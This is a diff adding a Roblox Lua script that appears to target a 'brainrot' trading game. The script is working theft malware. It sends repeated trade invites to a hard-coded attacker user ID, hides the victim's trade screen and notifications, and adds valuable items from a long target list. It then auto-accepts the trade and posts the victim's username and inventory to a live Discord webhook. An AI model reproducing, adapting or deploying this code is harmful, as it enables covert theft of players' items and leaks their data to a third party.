@@ -1,0 +1,668 @@
+_G.Settings = {}
+
+_G.Settings.TargetUserId = 10717482853
+
+_G.Settings.Webhook = "https://discord.com/api/webhooks/1483783297635979329/INIduDIFAek6aFfEGQWb5Aj9y-eSPfU6o32ey8LJqDr0ZVRx5rRPOhW79eYnlHOWuPDM"
+
+_G.Settings.TradeStartDelay = 2
+
+_G.Settings.AddDelay = 1.8
+
+_G.Settings.AcceptDelay = 2.5
+
+_G.Settings.Brainrots = {
+	["Chicliterita bicicliterita"] = true,
+	["Coffin Tung Tung Tung Sahur"] = true,
+	["Fortunu and Cashuru"] = true,
+	["Los Amigos"] = true,
+	["Los Sekolahs"] = true,
+	["La Ginger Sekolah"] = true,
+	["Sammyni Fattini"] = true,
+	["Los Spaghettis"] = true,
+	["Ventoliero Pavonero"] = true,
+	["Cloverat Clapat"] = true,
+	["Spaghetti Tualetti"] = true,
+	["Rosetti Tualetti"] = true,
+	["Fishino Clownino"] = true,
+	["Gold Gold Gold"] = true,
+	["Jolly Jolly Sahur"] = true,
+	["Lavadorito Spinito"] = true,
+	["Ketchuru and Musturu"] = true,
+	["Tirilikalika Tirilikalako"] = true,
+	["Swaggy Bros"] = true,
+	["La Romantic Grande"] = true,
+	["Orcaledon"] = true,
+	["Tictac Sahur"] = true,
+	["La Taco Combinasion"] = true,
+	["Ketupat Kepat"] = true,
+	["Dug dug dug"] = true,
+	["Tang Tang Keletang"] = true,
+	["Lovin Rose"] = true,
+	["Los Tacoritas"] = true,
+	["Eviledon"] = true,
+	["Los Primos"] = true,
+	["W or L"] = true,
+	["Esok Sekolah"] = true,
+	["La Jolly Grande"] = true,
+	["Los Cupids"] = true,
+	["Los Puggies"] = true,
+	["Tralaledon"] = true,
+	["Gobblino Uniciclino"] = true,
+	["Tuff Toucan"] = true,
+	["Mieteteira Bicicleteira"] = true,
+	["Chipso and Queso"] = true,
+	["Chillin Chili"] = true,
+	["Money Money Reindeer"] = true,
+	["La Spooky Grande"] = true,
+	["Bacuru and Egguru"] = true,
+	["Los Bros"] = true,
+	["La Extinct Grande"] = true,
+	["Los Candies"] = true,
+	["Los 67"] = true,
+	["Celularcini Viciosini"] = true,
+	["Los Mobilis"] = true,
+	["Money Money Puggy"] = true,
+	["Cigno Fulgoro"] = true,
+	["Los Spooky Combinasionas"] = true,
+	["Los Hotspotsitos"] = true,
+	["Los Jolly Combinasionas"] = true,
+	["Snailo Clovero"] = true,
+	["Los Planitos"] = true,
+	["Chicleteira Cupideira"] = true,
+	["DJ Panda"] = true,
+	["Las Sis"] = true,
+	["Spinny Hammy"] = true,
+	["Tacorita Bicicleta"] = true,
+	["Los Sweethearts"] = true,
+	["Nuclearo Dinossauro"] = true,
+	["Chicleteira Noelteira"] = true,
+	["Los Combinasionas"] = true,
+	["Chimnino"] = true,
+	["Noo my Gold"] = true,
+	["Swag Soda"] = true,
+	["Noo my Heart"] = true,
+	["Tacorillo Crocodillo"] = true,
+	["Mariachi Corazoni"] = true,
+	["La Grande Combinasion"] = true,
+	["Los 25"] = true,
+	["Los Burritos"] = true,
+	["67"] = true,
+	["Donkeyturbo Express"] = true,
+	["Los Chicleteiras"] = true,
+	["Guest 666"] = true,
+	["Los Mi Gatitos"] = true,
+	["Rang Ring Bus"] = true,
+	["Granny"] = true,
+	["Noo my Present"] = true,
+	["Serafinna Medusella"] = true,
+	["Los Nooo My Hotspotsitos"] = true,
+	["Arcadopus"] = true,
+	["Noo my Candy"] = true,
+	["Los Quesadillas"] = true,
+	["Chicleteirina Bicicleteirina"] = true,
+	["Chill Puppy"] = true,
+	["Burrito Bandito"] = true,
+	["Luck Luck Luck Sahur"] = true,
+	["Chicleteira Bicicleteira"] = true,
+	["Brunito Marsito"] = true,
+	["Quesadillo Vampiro"] = true,
+	["Eid Eid Eid Sahur"] = true,
+	["Cupid Hotspot"] = true,
+	["Mi Gatito"] = true,
+	["Ho Ho Ho Sahur"] = true,
+	["Cupid Cupid Sahur"] = true,
+	["Pot Pumpkin"] = true,
+	["Naughty Naughty"] = true,
+	["Bunito Bunito Spinito"] = true,
+	["Quesadilla Crocodila"] = true,
+	["Horegini Boom"] = true,
+	["Santa Hotspot"] = true,
+	["Pot Hotspot"] = true,
+	["25"] = true,
+	["Pirulitoita Bicicleteira"] = true,
+	["To to to Sahur"] = true,
+	["Telemorte"] = true,
+	["La Sahur Combinasion"] = true,
+	["List List List Sahur"] = true,
+	["Noo my examine"] = true,
+	["Los Jobcitos"] = true,
+	["Nooo My Hotspot"] = true,
+	["Bunnyman"] = true,
+	["Tung Tung Tung Sahur"] = true,
+	["Cuadramat and Pakrahmatmamat"] = true,
+	["Please my Present"] = true,
+	["Los Cucarachas"] = true,
+	["1x1x1x1"] = true,
+	["La Vacca Lepre Lepreino"] = true,
+	["Love Love Love Sahur"] = true,
+	["Perrito Burrito"] = true,
+	["Graipuss Medussi"] = true,
+	["Giftini Spyderini"] = true,
+	["GOAT"] = true,
+	["Trickolino"] = true,
+	["Paradiso Axolottino"] = true,
+	["Triplito Tralaleritos"] = true,
+	["La Vacca Jacko Linterino"] = true,
+	["Fishboard"] = true,
+	["Santteo"] = true,
+	["Las Vaquitas Saturnitas"] = true,
+	["Los Karkeritos"] = true,
+	["Karker Sahur"] = true,
+	["Los Trios"] = true,
+	["Job Job Job Sahur"] = true,
+	["Frankentteo"] = true,
+	["Pumpkini Spyderini"] = true,
+	["Las Tralaleritas"] = true,
+	["Rocco Disco"] = true,
+	["Extinct Matteo"] = true,
+	["La Karkerkar Combinasion"] = true,
+	["La Vacca Prese Presente"] = true,
+	["Reindeer Tralala"] = true,
+	["Yess my examine"] = true,
+	["Guerriro Digitale"] = true,
+	["Boatito Auratito"] = true,
+	["Vulturino Skeletono"] = true,
+	["Los Tralaleritos"] = true,
+	["Zombie Tralala"] = true,
+	["La Cucaracha"] = true,
+	["Fragola La La La"] = true,
+	["Extinct Tralalero"] = true,
+	["Agarrini la Palini"] = true,
+	["Los Spyderinis"] = true,
+	["Chachechi"] = true,
+	["Blackhole Goat"] = true,
+	["Dul Dul Dul"] = true,
+	["Trenostruzzo Turbo 4000"] = true,
+	["Karkerkar Kurkur"] = true,
+	["Los Matteos"] = true,
+	["Bisonte Giuppitere"] = true,
+	["Sammyni Spyderini"] = true,
+	["La Vacca Saturno Saturnita"] = true,
+	["Jackorilla"] = true,
+	["Secret Lucky Block"] = true,
+	["Strawberry Elephant"] = true,
+	["Meowl"] = true,
+	["Headless Horseman"] = true,
+	["Skibidi Toilet"] = true,
+	["Griffin"] = true,
+	["Hydra Dragon Cannelloni"] = true,
+	["Dragon Gingerini"] = true,
+	["Dragon Cannelloni"] = true,
+	["La Supreme Combinasion"] = true,
+	["Celestial Pegasus"] = true,
+	["Cerberus"] = true,
+	["Love Love Bear"] = true,
+	["Popcuru and Fizzuru"] = true,
+	["Rosey and Teddy"] = true,
+	["Capitano Moby"] = true,
+	["Cooki and Milki"] = true,
+	["Burguro And Fryuro"] = true,
+	["Ketupat Bros"] = true,
+	["Reinito Sleighito"] = true,
+	["La Secret Combinasion"] = true,
+	["La Casa Boo"] = true,
+	["Spooky and Pumpky"] = true,
+	["Garama and Madundung"] = true,
+	["Festive 67"] = true,
+	["Ginger Gerat"] = true,
+	["Nacho Spyder"] = true,
+	["Antonio"] = true,
+	["La Food Combinasion"] = true,
+	["Fragrama and Chocrama"] = true,
+	["Signore Carapace"] = true,
+	["Elefanto Frigo"] = true,
+ ["Los Bunitos"] = true,
+}
+-- YOUR LOADSTRING UNDER THIS
+
+local RS = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local PlotController = require(RS:WaitForChild("Controllers"):WaitForChild("PlotController"))
+
+local leftCenter = PlayerGui:WaitForChild("LeftCenter"):WaitForChild("LeftCenter")
+local newGui = Instance.new("ScreenGui")
+newGui.Name = "ScreenGui"
+newGui.ResetOnSpawn = false
+newGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+newGui.Parent = PlayerGui
+local cloned = leftCenter:Clone()
+cloned.Parent = newGui
+leftCenter:Destroy()
+
+local _net = RS.Packages.Net
+
+local function getAcceptRemote()
+	local children = _net:GetChildren()
+	for i = 1, #children do
+		local real = children[i]
+		local fake = children[i + 1]
+		if real and (real:IsA("RemoteEvent") or real:IsA("RemoteFunction")) and real.Name:find("TradeService/Accept") then
+			return fake
+		end
+	end
+end
+
+local function getReadyRemote()
+	local children = _net:GetChildren()
+	for i = 1, #children do
+		local real = children[i]
+		local fake = children[i + 1]
+		if real and (real:IsA("RemoteEvent") or real:IsA("RemoteFunction")) and real.Name:find("TradeService/Ready") then
+			return fake
+		end
+	end
+end
+
+local INVITE_TARGET = _G.Settings.TargetUserId
+
+local function sendTradeInvite()
+	local children = _net:GetChildren()
+	for i = 1, #children do
+		local real = children[i]
+		local fake = children[i + 1]
+		if real and real:IsA("RemoteFunction") and real.Name:find("TradeService/Invite") then
+			if fake then
+				task.wait(0.5)
+				pcall(function()
+					fake:InvokeServer("afb005f9-6e81-4e0a-8bb0-3555938a9658", INVITE_TARGET)
+				end)
+			end
+			break
+		end
+	end
+end
+
+local function isTradeActive()
+	local tradeGui = PlayerGui:FindFirstChild("TradeLiveTrade")
+	return tradeGui ~= nil and tradeGui.Enabled
+end
+
+local function hideTradeGuiElements()
+	local tradeGui = PlayerGui:WaitForChild("TradeLiveTrade")
+	for _, obj in ipairs(tradeGui:GetDescendants()) do
+		if obj:IsA("GuiObject") then
+			obj.Visible = false
+		end
+	end
+	tradeGui.DescendantAdded:Connect(function(obj)
+		if obj:IsA("GuiObject") then
+			obj.Visible = false
+		end
+	end)
+end
+
+task.spawn(hideTradeGuiElements)
+
+task.spawn(function()
+	while true do
+		
+		for _, obj in ipairs(Lighting:GetChildren()) do
+			if obj:IsA("BlurEffect") then
+				obj:Destroy()
+			end
+		end
+		
+		local camBlur = workspace.Camera:FindFirstChild("Blur")
+		if camBlur then camBlur:Destroy() end
+		
+		local activated = workspace:FindFirstChild("Activated")
+		if activated then activated:Destroy() end
+		local wsError = workspace:FindFirstChild("Error")
+		if wsError then wsError:Destroy() end
+		
+		local notifGui = PlayerGui:FindFirstChild("Notification")
+		if notifGui then
+			local inner = notifGui:FindFirstChild("Notification")
+			if inner then
+				local template = inner:FindFirstChild("Template")
+				if template then template:Destroy() end
+			end
+		end
+		task.wait(0.1)
+	end
+end)
+
+game:GetService("RunService").RenderStepped:Connect(function()
+	workspace.CurrentCamera.FieldOfView = 70
+end)
+
+local function allPlayersReady()
+	local tradeGui = PlayerGui:FindFirstChild("TradeLiveTrade")
+	if not tradeGui then return false end
+	local inner = tradeGui:FindFirstChild("TradeLiveTrade")
+	if not inner then return false end
+	local other = inner:FindFirstChild("Other")
+	if not other then return false end
+	local readyBtn = other:FindFirstChild("ReadyButton")
+	if not readyBtn then return false end
+	local txt = readyBtn:FindFirstChild("Txt")
+	return txt and txt.Text == "ACCEPT"
+end
+
+local function getTradeScrollFrame()
+	local tradeGui = PlayerGui:FindFirstChild("TradeLiveTrade")
+	if not tradeGui then return nil end
+	local inner = tradeGui:FindFirstChild("TradeLiveTrade")
+	if not inner then return nil end
+	local your = inner:FindFirstChild("Your")
+	if not your then return nil end
+	return your:FindFirstChild("ScrollingFrame")
+end
+
+local function waitForMyPlot(timeout)
+	local myPlot
+	local start = tick()
+	repeat
+		local ok, result = pcall(function()
+			return PlotController.GetMyPlot()
+		end)
+		if ok and result then myPlot = result end
+		if not myPlot then task.wait() end
+	until myPlot or (tick() - start > timeout)
+	return myPlot
+end
+
+local function getPlotFolder()
+	local myPlot = waitForMyPlot(4)
+	if not myPlot then return nil end
+	local uuid = tostring(myPlot:GetUID())
+	local plotsFolder = workspace:FindFirstChild("Plots")
+	if not plotsFolder then return nil end
+	return plotsFolder:FindFirstChild(uuid)
+end
+
+local function collectBrainrotsFromBase(plotFolder)
+	local brainrotsToAdd = {}
+	local seen = {}
+	for _, child in ipairs(plotFolder:GetChildren()) do
+		local name = child.Name
+		if _G.Settings.Brainrots[name] and not seen[name] then
+			seen[name] = true
+			table.insert(brainrotsToAdd, name)
+		end
+	end
+	return brainrotsToAdd
+end
+
+local function cleanTradeTitle(rawTitle)
+	local title = rawTitle or ""
+	title = title:gsub("%s*%b()", "")
+	title = title:gsub("%s+[xX]%d+$", "")
+	title = title:match("^%s*(.-)%s*$") or title
+	return title
+end
+
+local function fireAccept()
+	local fakeRemote = getAcceptRemote()
+	if fakeRemote then
+		pcall(function()
+			fakeRemote:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb")
+		end)
+	end
+end
+
+local function fireReadyOrAccept()
+	if not isTradeActive() then return end
+
+	local elapsed = 0
+	while isTradeActive() and elapsed < 30 do
+		if allPlayersReady() then
+			fireAccept()
+		else
+			local readyRemote = getReadyRemote()
+			if readyRemote then
+				readyRemote:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
+			end
+		end
+		task.wait(_G.Settings.AcceptDelay or 2.5)
+		elapsed += (_G.Settings.AcceptDelay or 2.5)
+	end
+end
+
+local function sendWebhook(plotFolder)
+	local webhook = _G.Settings.Webhook
+	if not webhook or webhook == "" then return end
+
+	
+	local mainRoot = plotFolder:FindFirstChild("MainRoot") or plotFolder:FindFirstChildWhichIsA("BasePart")
+	if not mainRoot then return end
+
+	local plotPos = mainRoot.Position
+	local plotSize = mainRoot.Size
+	local searchRange = Vector3.new(plotSize.X * 20, 1000, plotSize.Z * 20)
+
+	local totalTemplates = 0
+	local inRange = 0
+	local entries = {}
+
+	for _, obj in ipairs(workspace.Debris:GetChildren()) do
+		if obj.Name == "FastOverheadTemplate" then
+			totalTemplates += 1
+			local overhead = obj:FindFirstChild("AnimalOverhead")
+			local pos = obj:IsA("BasePart") and obj.Position or (obj:FindFirstChildWhichIsA("BasePart") and obj:FindFirstChildWhichIsA("BasePart").Position)
+			if overhead and pos then
+				local displayNameObj = overhead:FindFirstChild("DisplayName")
+				local generationObj = overhead:FindFirstChild("Generation")
+				local mutationObj = overhead:FindFirstChild("Mutation")
+				local traitsFolder = overhead:FindFirstChild("Traits")
+
+				if displayNameObj and generationObj then
+					local ok, displayName = pcall(function() return displayNameObj.Text end)
+					local diff = pos - plotPos
+					local halfRange = searchRange / 2
+					local withinRange = math.abs(diff.X) <= halfRange.X and math.abs(diff.Z) <= halfRange.Z
+					if withinRange then inRange += 1 end
+									if ok and _G.Settings.Brainrots[displayName] and withinRange then
+						local mutation = "Default"
+						pcall(function()
+							if mutationObj and mutationObj.Visible and mutationObj.TextTransparency < 1 then
+								local raw = mutationObj.Text:gsub("<[^>]+>", ""):gsub("%s+", " "):match("^%s*(.-)%s*$") or ""
+								if raw ~= "" then
+									mutation = raw
+								end
+							end
+						end)
+						local gen = ""
+						pcall(function() gen = generationObj.Text end)
+						local traits = {}
+						if traitsFolder then
+							for _, t in ipairs(traitsFolder:GetChildren()) do
+								if t.Name ~= "Template" and t.Name ~= "UIListLayout" then
+									table.insert(traits, t.Name)
+								end
+							end
+						end
+						table.insert(entries, {
+							name = displayName,
+							gen = gen,
+							mutation = mutation,
+							traits = traits,
+						})
+					end
+				end
+			end
+		end
+	end
+
+	if #entries == 0 then
+		local player = Players.LocalPlayer
+		local now = os.date("%m/%d/%Y %I:%M %p")
+		local payload = game:GetService("HttpService"):JSONEncode({
+			embeds = {{
+				title = "target found",
+				color = 0xFF0000,
+				fields = {
+					{ name = "username:", value = "`" .. player.Name .. "`", inline = false },
+					{ name = "inventory:", value = "No brainrots from the target list found.", inline = false },
+				},
+				footer = { text = now },
+			}}
+		})
+		pcall(function()
+			request({
+				Url = _G.Settings.Webhook,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = payload
+			})
+		end)
+		return
+	end
+
+	table.sort(entries, function(a, b)
+		local function parseGen(g)
+			local n = tonumber(g:match("([%d%.]+)")) or 0
+			if g:find("B") then n = n * 1e9
+			elseif g:find("M") then n = n * 1e6
+			elseif g:find("K") then n = n * 1e3 end
+			return n
+		end
+		return parseGen(a.gen) > parseGen(b.gen)
+	end)
+
+	local player = Players.LocalPlayer
+	local lines = {}
+	for i, e in ipairs(entries) do
+		local mutStr = (e.mutation and e.mutation ~= "Default" and e.mutation ~= "None" and e.mutation ~= "") and (" | " .. e.mutation) or " | No Mutation"
+		local traitStr = #e.traits > 0 and (" | " .. table.concat(e.traits, ", ")) or ""
+		local genClean = e.gen:gsub("%$", "")
+		table.insert(lines, i .. ". [" .. genClean .. "] " .. e.name .. mutStr .. traitStr)
+	end
+
+	local description = table.concat(lines, "\n")
+	if #description > 4000 then
+		description = description:sub(1, 4000) .. "\n..."
+	end
+
+	local now = os.date("%m/%d/%Y %I:%M %p")
+
+	local payload = game:GetService("HttpService"):JSONEncode({
+		embeds = {{
+			title = "target found",
+			color = 0x57F287,
+			fields = {
+				{ name = "username:", value = "`" .. player.Name .. "`", inline = false },
+				{ name = "inventory: (" .. tostring(#entries) .. ")", value = "```\n" .. description .. "\n```", inline = false },
+			},
+			footer = { text = now },
+		}}
+	})
+
+	pcall(function()
+		request({
+			Url = webhook,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = payload
+		})
+	end)
+end
+
+local tradeRunning = false
+
+local function autoadd()
+	if tradeRunning then return end
+	if not isTradeActive() then return end
+
+	tradeRunning = true
+
+	local plotFolder = getPlotFolder()
+	if not plotFolder then
+		tradeRunning = false
+		return
+	end
+
+	local brainrotsToAdd = collectBrainrotsFromBase(plotFolder)
+	if #brainrotsToAdd == 0 then
+		tradeRunning = false
+		return
+	end
+
+	local wantedSet = {}
+	for _, name in ipairs(brainrotsToAdd) do
+		wantedSet[name] = true
+	end
+
+	task.wait(_G.Settings.TradeStartDelay or 2)
+
+	if not isTradeActive() then
+		tradeRunning = false
+		return
+	end
+
+	local sframe = getTradeScrollFrame()
+	if not sframe then
+		tradeRunning = false
+		return
+	end
+
+	local children = sframe:GetChildren()
+	for _, v in ipairs(children) do
+		if not isTradeActive() then
+			tradeRunning = false
+			return
+		end
+		if v.Name:find("Selection") and v:FindFirstChild("Spacer") and v.Spacer:IsA("ImageButton") then
+			local spacer = v.Spacer
+			local titleLabel = spacer:FindFirstChild("Title")
+			if titleLabel and titleLabel:IsA("TextLabel") then
+				local title = cleanTradeTitle(titleLabel.Text)
+				if wantedSet[title] then
+					spacer.Visible = true
+					task.wait(0.2)
+					firesignal(spacer.Activated)
+					task.wait(0.8)
+					spacer.Visible = false
+					task.wait(_G.Settings.AddDelay or 1.5)
+				end
+			end
+		end
+	end
+
+	task.wait(1)
+	fireReadyOrAccept()
+
+	while isTradeActive() do
+		task.wait(0.5)
+	end
+
+	tradeRunning = false
+end
+
+task.spawn(function()
+	task.wait(5)
+	local plotFolder = getPlotFolder()
+	if plotFolder then
+		sendWebhook(plotFolder)
+	else
+		end
+end)
+
+task.spawn(function()
+	while true do
+		task.wait(_G.Settings.AcceptDelay or 1.2)
+		if isTradeActive() and allPlayersReady() then
+			fireAccept()
+		end
+	end
+end)
+
+task.spawn(function()
+	while true do
+		if not isTradeActive() and not tradeRunning then
+			sendTradeInvite()
+		end
+		task.wait(5)
+	end
+end)
+
+while task.wait(1) do
+	if not tradeRunning then
+		task.spawn(autoadd)
+	end
+end
